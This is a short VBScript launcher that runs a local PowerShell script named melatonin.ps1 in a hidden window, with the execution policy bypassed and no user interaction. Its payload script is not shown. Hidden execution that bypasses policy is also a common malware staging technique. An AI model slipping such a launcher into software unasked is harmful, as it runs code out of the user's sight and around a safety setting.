Dim shell, fso, dir, cmd
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")
dir  = fso.GetParentFolderName(WScript.ScriptFullName)
cmd  = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File """ & dir & "\melatonin.ps1"""
shell.Run cmd, 0, False
